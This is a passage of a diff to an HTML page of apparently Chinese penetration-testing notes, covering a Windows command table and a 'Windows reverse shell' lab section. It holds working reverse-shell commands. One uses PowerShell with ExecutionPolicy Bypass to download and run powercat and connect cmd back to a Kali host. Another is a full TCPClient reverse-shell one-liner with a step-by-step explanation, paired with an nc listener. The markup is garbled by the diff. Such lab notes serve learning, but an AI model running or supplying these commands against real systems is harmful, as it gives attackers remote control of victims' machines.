+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;start&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">启动服务</font></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td></code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">stop</font><code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;stop&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">停止服务</font></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td></code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">create</font><code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;create&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">创建服务</font></td>
 </tr>
 <tr>
 <td><strong><font style="color:rgba(0, 0, 0, 0.88);">系统信息</font></strong></td>
-<td></code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">systeminfo</font>&#96;</td>
-<td>&#96;<font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">&#x2F;fo format</font><code></td>
-<td><font style="color:rgba(0, 0, 0, 0.88);">指定输出格式(table/list/csv)</font></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;systeminfo&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;/fo format&lt;/font&gt;</code></td>
+<td><font style="color:rgba(0, 0, 0, 0.88);">指定输出格式(table&#x2F;list&#x2F;csv)</font></td>
 </tr>
 <tr>
 <td></td>
-<td></code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">sfc</font>&#96;</td>
-<td>&#96;<font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">&#x2F;scannow</font><code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;sfc&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;/scannow&lt;/font&gt;</code></td>
 <td><strong><font style="color:rgba(0, 0, 0, 0.88);">立即扫描所有受保护的系统文件</font></strong></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td></code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">&#x2F;verifyonly</font><code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;/verifyonly&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">扫描但不修复</font></td>
 </tr>
 <tr>
 <td><strong><font style="color:rgba(0, 0, 0, 0.88);">FTP传输</font></strong></td>
-<td></code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">ftp</font>&#96;</td>
-<td>&#96;<font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">-i</font><code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;ftp&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;-i&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">关闭交互模式</font></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td></code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">-s:file</font><code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;-s:file&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">执行指定文件中的ftp命令</font></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td></code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">-v</font><code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;-v&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">禁止显示远程服务器响应</font></td>
 </tr>
 <tr>
 <td><strong><font style="color:rgba(0, 0, 0, 0.88);">注册表</font></strong></td>
-<td></code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">reg</font>&#96;</td>
-<td>&#96;<font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">query</font><code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;reg&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;query&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">查询注册表键值</font></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td></code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">add</font><code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;add&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">添加新的注册表项</font></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td></code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">delete</font><code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;delete&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">删除注册表项</font></td>
 </tr>
 <tr>
 <td><strong><font style="color:rgba(0, 0, 0, 0.88);">用户账户</font></strong></td>
-<td></code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">net user</font>&#96;</td>
-<td>&#96;<font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">username &#x2F;add</font><code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;net user&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;username /add&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">添加用户账户</font></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td></code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">username &#x2F;delete</font><code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;username /delete&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">删除用户账户</font></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td></code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">username password</font><code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;username password&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">更改用户密码</font></td>
 </tr>
 <tr>
 <td><strong><font style="color:rgba(0, 0, 0, 0.88);">计划任务</font></strong></td>
-<td></code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">schtasks</font>&#96;</td>
-<td>&#96;<font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">&#x2F;create</font><code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;schtasks&lt;/font&gt;</code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;/create&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">创建新计划任务</font></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td></code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">&#x2F;delete</font><code></td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;/delete&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">删除计划任务</font></td>
 </tr>
 <tr>
 <td></td>
 <td></td>
-<td></code><font style="color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);">&#x2F;query</font>`</td>
+<td><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);&quot;&gt;/query&lt;/font&gt;</code></td>
 <td><font style="color:rgba(0, 0, 0, 0.88);">显示所有计划任务</font></td>
 </tr>
 </tbody></table>
 <h2 id="Windows反弹shell-Win-192-168-129-161-KaLi-192-168-129-152"><a href="#Windows反弹shell-Win-192-168-129-161-KaLi-192-168-129-152" class="headerlink" title="Windows反弹shell  Win 192.168.129.161  KaLi  192.168.129.152"></a>Windows反弹shell  Win 192.168.129.161  KaLi  192.168.129.152</h2><h3 id="powercat"><a href="#powercat" class="headerlink" title="powercat"></a><font style="color:rgba(0, 0, 0, 0.85);">powercat</font></h3><ul>
-<li>kali<ul>
+<li>kali  <ul>
 <li>nc -lvp 5555</li>
 </ul>
 </li>
-<li>windows<ul>
+<li>windows <ul>
 <li>powershell -ExecutionPolicy Bypass -Command “$content &#x3D; Invoke-RestMethod ‘<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1';">https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;;</a> Invoke-Expression $content; powercat -c 192.168.129.152 -p 5555 -e cmd”</li>
 <li>解释：<ol>
-<li>powershell<br>这是调用 PowerShell 的命令。在 Windows 的命令提示符（cmd）中，你可以通过 powershell 命令启动 PowerShell 环境。</li>
-<li>-ExecutionPolicy Bypass<br>这是一个重要的参数，用于绕过 PowerShell 的执行策略限制。默认情况下，PowerShell 会限制运行未签名的脚本，以防止恶意脚本的执行。-ExecutionPolicy Bypass 选项允许你临时绕过这些限制，只在当前会话中运行指定的命令。</li>
-<li>-Command<br>这个参数用于指定要执行的 PowerShell 命令。你可以将多个命令放在一个字符串中，用分号 ; 分隔。这些命令将在同一个 PowerShell 会话中依次执行。</li>
-<li>$ content &#x3D; Invoke-RestMethod ‘<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1">https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1</a> ‘<br>$content：这是一个变量，用于存储从网络下载的内容。<br>Invoke-RestMethod：这是一个 PowerShell 命令，用于从指定的 URL 下载内容。它会返回下载的内容，而不是保存到文件。<br>‘<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1">https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1</a> ‘：这是 powercat.ps1 脚本的 GitHub 原始链接。Invoke-RestMethod 会从这个 URL 下载脚本内容。</li>
-<li>Invoke-Expression $ content<br>Invoke-Expression：这是一个 PowerShell 命令，用于执行字符串中的 PowerShell 命令。在这个例子中，它会执行从 GitHub 下载的 powercat.ps1 脚本内容。<br>$content：这是之前下载的脚本内容。Invoke-Expression 会将这些内容作为 PowerShell 令执行。</li>
-<li>powercat -c 192.168.129.152 -p 5555 -e cmd<br>powercat：这是 powercat.ps1 脚本中的一个命令，用于建立网络连接。<br>-c 192.168.129.152：指定要连接的目标 IP 地址。<br>-p 5555：指定要连接的目标端口号。<br>-e cmd：指定在建立连接后执行的命令。在这个例子中，cmd 表示启动 Windows 的命令提示符（cmd.exe）。</li>
+<li>powershell</li>
 </ol>
 </li>
 </ul>
 </li>
 </ul>
+<p>这是调用 PowerShell 的命令。在 Windows 的命令提示符（cmd）中，你可以通过 powershell 命令启动 PowerShell 环境。<br>        2. -ExecutionPolicy Bypass<br>这是一个重要的参数，用于绕过 PowerShell 的执行策略限制。默认情况下，PowerShell 会限制运行未签名的脚本，以防止恶意脚本的执行。-ExecutionPolicy Bypass 选项允许你临时绕过这些限制，只在当前会话中运行指定的命令。<br>        3. -Command<br>这个参数用于指定要执行的 PowerShell 命令。你可以将多个命令放在一个字符串中，用分号 ; 分隔。这些命令将在同一个 PowerShell 会话中依次执行。<br>        4. <img src="https://cdn.nlark.com/yuque/__latex/052d725fa3c87498abbeb7b3547bb517.svg" alt="image">content：这是一个变量，用于存储从网络下载的内容。<br>Invoke-RestMethod：这是一个 PowerShell 命令，用于从指定的 URL 下载内容。它会返回下载的内容，而不是保存到文件。<br>‘<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1">https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1</a> ‘：这是 powercat.ps1 脚本的 GitHub 原始链接。Invoke-RestMethod 会从这个 URL 下载脚本内容。<br>        5. Invoke-Expression <img src="https://cdn.nlark.com/yuque/__latex/a43a71e7d4790d705121b2468d925882.svg" alt="image">content：这是之前下载的脚本内容。Invoke-Expression 会将这些内容作为 PowerShell 令执行。<br>        6. powercat -c 192.168.129.152 -p 5555 -e cmd<br>powercat：这是 powercat.ps1 脚本中的一个命令，用于建立网络连接。<br>-c 192.168.129.152：指定要连接的目标 IP 地址。<br>-p 5555：指定要连接的目标端口号。<br>-e cmd：指定在建立连接后执行的命令。在这个例子中，cmd 表示启动 Windows 的命令提示符（cmd.exe）。</p>
 <h3 id="nishang"><a href="#nishang" class="headerlink" title="nishang"></a><font style="color:rgba(0, 0, 0, 0.85);">nishang</font></h3><ul>
-<li>kali<ul>
+<li>kali  <ul>
 <li>nc -lvp 5555</li>
 </ul>
 </li>
@@ -758,7 +756,7 @@
 </li>
 </ul>
 <h3 id="自定义powershell函数反弹shell"><a href="#自定义powershell函数反弹shell" class="headerlink" title="自定义powershell函数反弹shell"></a><font style="color:rgba(0, 0, 0, 0.85);">自定义powershell函数反弹shell</font></h3><ul>
-<li>kali<ul>
+<li>kali  <ul>
 <li>nc -lvp 5555</li>
 </ul>
 </li>
@@ -767,66 +765,66 @@
 <li><font style="color:rgba(0, 0, 0, 0.9);background-color:rgb(245, 245, 245);">powershell -nop -c “$client &#x3D; New-Object Net.Sockets.TCPClient(‘192.168.129.152’,5555);$stream &#x3D; $client.GetStream(); [byte[]]$bytes &#x3D; 0..65535|%{0};while(($i &#x3D; $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data &#x3D; (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback &#x3D; (iex $data 2&gt;&amp;1 | Out-String ); $sendback2 &#x3D; $sendback + ‘PS ‘ + (pwd).Path + ‘&gt; ‘;$sendbyte &#x3D; ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()”</font></li>
 </ul>
 <ol>
-<li><code><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">powershell -nop -c</font></strong></code><font style="color:rgba(0, 0, 0, 0.9);">:</font><ul>
-<li><code><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">powershell</font></strong></code><font style="color:rgba(0, 0, 0, 0.9);">: 调用 PowerShell。</font></li>
-<li><code><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">-nop</font></strong></code><font style="color:rgba(0, 0, 0, 0.9);">: 简写为 </font><code><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">-NoProfile</font></code><font style="color:rgba(0, 0, 0, 0.9);">，表示不加载用户配置文件。这可以加快启动速度，并避免配置文件中的设置影响脚本运行。</font></li>
-<li><code><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">-c</font></strong></code><font style="color:rgba(0, 0, 0, 0.9);">: 简写为 </font><code><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">-Command</font></code><font style="color:rgba(0, 0, 0, 0.9);">，表示执行指定的命令。</font></li>
+<li><code>**&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;powershell -nop -c&lt;/font&gt;**</code><font style="color:rgba(0, 0, 0, 0.9);">:</font><ul>
+<li><code>**&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;powershell&lt;/font&gt;**</code><font style="color:rgba(0, 0, 0, 0.9);">: 调用 PowerShell。</font></li>
+<li><code>**&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;-nop&lt;/font&gt;**</code><font style="color:rgba(0, 0, 0, 0.9);">: 简写为 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;-NoProfile&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.9);">，表示不加载用户配置文件。这可以加快启动速度，并避免配置文件中的设置影响脚本运行。</font></li>
+<li><code>**&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;-c&lt;/font&gt;**</code><font style="color:rgba(0, 0, 0, 0.9);">: 简写为 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;-Command&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.9);">，表示执行指定的命令。</font></li>
 </ul>
 </li>
-<li><code><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">$client = New-Object Net.Sockets.TCPClient(&#39;192.168.129.152&#39;,5555)</font></strong></code><font style="color:rgba(0, 0, 0, 0.9);">:</font><ul>
-<li><font style="color:rgba(0, 0, 0, 0.9);">创建一个 </font><code><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">TCPClient</font></code><font style="color:rgba(0, 0, 0, 0.9);"> 对象，用于建立 TCP 连接。</font></li>
-<li><code><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">&#39;192.168.129.152&#39;</font></strong></code><font style="color:rgba(0, 0, 0, 0.9);">: 目标服务器的 IP 地址。</font></li>
-<li><code><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">5555</font></strong></code><font style="color:rgba(0, 0, 0, 0.9);">: 目标服务器的端口号。</font></li>
+<li><code>**&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;$client = New-Object Net.Sockets.TCPClient(&#39;192.168.129.152&#39;,5555)&lt;/font&gt;**</code><font style="color:rgba(0, 0, 0, 0.9);">:</font><ul>
+<li><font style="color:rgba(0, 0, 0, 0.9);">创建一个 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;TCPClient&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.9);"> 对象，用于建立 TCP 连接。</font></li>
+<li><code>**&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&#39;192.168.129.152&#39;&lt;/font&gt;**</code><font style="color:rgba(0, 0, 0, 0.9);">: 目标服务器的 IP 地址。</font></li>
+<li><code>**&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;5555&lt;/font&gt;**</code><font style="color:rgba(0, 0, 0, 0.9);">: 目标服务器的端口号。</font></li>
 </ul>
 </li>
-<li><code><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">$stream = $client.GetStream()</font></strong></code><font style="color:rgba(0, 0, 0, 0.9);">:</font><ul>
-<li><font style="color:rgba(0, 0, 0, 0.9);">获取 </font><code><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">TCPClient</font></code><font style="color:rgba(0, 0, 0, 0.9);"> 的网络流（</font><code><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">NetworkStream</font></code><font style="color:rgba(0, 0, 0, 0.9);">），用于读取和写入数据。</font></li>
+<li><code>**&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;$stream = $client.GetStream()&lt;/font&gt;**</code><font style="color:rgba(0, 0, 0, 0.9);">:</font><ul>
+<li><font style="color:rgba(0, 0, 0, 0.9);">获取 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;TCPClient&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.9);"> 的网络流（</font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;NetworkStream&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.9);">），用于读取和写入数据。</font></li>
 </ul>
 </li>
-<li><code><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">[byte[]]$bytes = 0..65535|%{0}</font></strong></code><font style="color:rgba(0, 0, 0, 0.9);">:</font><ul>
+<li><code>**&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;[byte[]]$bytes = 0..65535|%{0}&lt;/font&gt;**</code><font style="color:rgba(0, 0, 0, 0.9);">:</font><ul>
 <li><font style="color:rgba(0, 0, 0, 0.9);">创建一个大小为 65536 的字节数组，用于存储从网络流中读取的数据。</font></li>
-<li><code><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">0..65535</font></strong></code><font style="color:rgba(0, 0, 0, 0.9);">: 生成一个从 0 到 65535 的数字序列。</font></li>
-<li><code><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">|%{0}</font></strong></code><font style="color:rgba(0, 0, 0, 0.9);">: 对每个数字生成一个值为 0 的字节。</font></li>
+<li><code>**&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;0..65535&lt;/font&gt;**</code><font style="color:rgba(0, 0, 0, 0.9);">: 生成一个从 0 到 65535 的数字序列。</font></li>
+<li><code>**&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;|%{0}&lt;/font&gt;**</code><font style="color:rgba(0, 0, 0, 0.9);">: 对每个数字生成一个值为 0 的字节。</font></li>
 </ul>
 </li>
-<li><code><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)</font></strong></code><font style="color:rgba(0, 0, 0, 0.9);">:</font><ul>
+<li><code>**&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&lt;/font&gt;**</code><font style="color:rgba(0, 0, 0, 0.9);">:</font><ul>
 <li><font style="color:rgba(0, 0, 0, 0.9);">从网络流中读取数据，直到没有更多数据可读。</font></li>
-<li><code><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">$stream.Read($bytes, 0, $bytes.Length)</font></strong></code><font style="color:rgba(0, 0, 0, 0.9);">: 从网络流中读取数据到 </font><code><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">$bytes</font></code><font style="color:rgba(0, 0, 0, 0.9);"> 数组中，返回读取的字节数。</font></li>
-<li><code><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">-ne 0</font></strong></code><font style="color:rgba(0, 0, 0, 0.9);">: 检查是否读取到数据（即返回值不为 0）。</font></li>
+<li><code>**&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;$stream.Read($bytes, 0, $bytes.Length)&lt;/font&gt;**</code><font style="color:rgba(0, 0, 0, 0.9);">: 从网络流中读取数据到 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;$bytes&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.9);"> 数组中，返回读取的字节数。</font></li>
+<li><code>**&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;-ne 0&lt;/font&gt;**</code><font style="color:rgba(0, 0, 0, 0.9);">: 检查是否读取到数据（即返回值不为 0）。</font></li>
 </ul>
 </li>
-<li><code><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)</font></strong></code><font style="color:rgba(0, 0, 0, 0.9);">:</font><ul>
+<li><code>**&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)&lt;/font&gt;**</code><font style="color:rgba(0, 0, 0, 0.9);">:</font><ul>
 <li><font style="color:rgba(0, 0, 0, 0.9);">将读取的字节转换为字符串。</font></li>
-<li><code><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">System.Text.ASCIIEncoding</font></strong></code><font style="color:rgba(0, 0, 0, 0.9);">: 使用 ASCII 编码将字节转换为字符串。</font></li>
-<li><code><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">$i</font></strong></code><font style="color:rgba(0, 0, 0, 0.9);">: 读取的字节数。</font></li>
+<li><code>**&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;System.Text.ASCIIEncoding&lt;/font&gt;**</code><font style="color:rgba(0, 0, 0, 0.9);">: 使用 ASCII 编码将字节转换为字符串。</font></li>
+<li><code>**&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;$i&lt;/font&gt;**</code><font style="color:rgba(0, 0, 0, 0.9);">: 读取的字节数。</font></li>
 </ul>
 </li>
-<li><code><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">$sendback = (iex $data 2&gt;&amp;1 | Out-String )</font></strong></code><font style="color:rgba(0, 0, 0, 0.9);">:</font><ul>
+<li><code>**&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;$sendback = (iex $data 2&gt;&amp;1 | Out-String )&lt;/font&gt;**</code><font style="color:rgba(0, 0, 0, 0.9);">:</font><ul>
 <li><font style="color:rgba(0, 0, 0, 0.9);">执行从网络流中读取的命令，并捕获输出。</font></li>
-<li><code><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">iex $data</font></strong></code><font style="color:rgba(0, 0, 0, 0.9);">: 使用 </font><code><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">Invoke-Expression</font></code><font style="color:rgba(0, 0, 0, 0.9);">（</font><code><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">iex</font></code><font style="color:rgba(0, 0, 0, 0.9);">）执行 </font><code><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">$data</font></code><font style="color:rgba(0, 0, 0, 0.9);"> 中的命令。</font></li>
-<li><code><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">2&gt;&amp;1</font></strong></code><font style="color:rgba(0, 0, 0, 0.9);">: 将错误输出重定向到标准输出。</font></li>
-<li><code><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);">| Out-String</font></strong></code><font style="color:rgba(0, 0, 0, 0.9);">: 将输出转换为字符串。</font></li>
